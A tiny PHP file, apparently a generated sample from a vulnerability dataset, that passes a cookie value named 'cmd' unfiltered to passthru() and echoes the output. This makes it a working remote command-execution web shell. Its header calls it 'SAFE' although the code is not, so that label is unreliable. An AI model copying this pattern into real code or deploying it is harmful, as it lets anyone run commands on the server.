<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=COOKIE; CE_MODE=COOKIE_ISSET; SKELETON=S0; KEY=cmd; SINK=B4; VAR=v0067 */
function SINK_B4($command){
    passthru($command);
}
$inp = isset($_COOKIE["cmd"]) ? (string)$_COOKIE["cmd"] : "";
$inp = (string)$inp; // no value processing
$out = SINK_B4($inp);
echo (string)($out);
?>
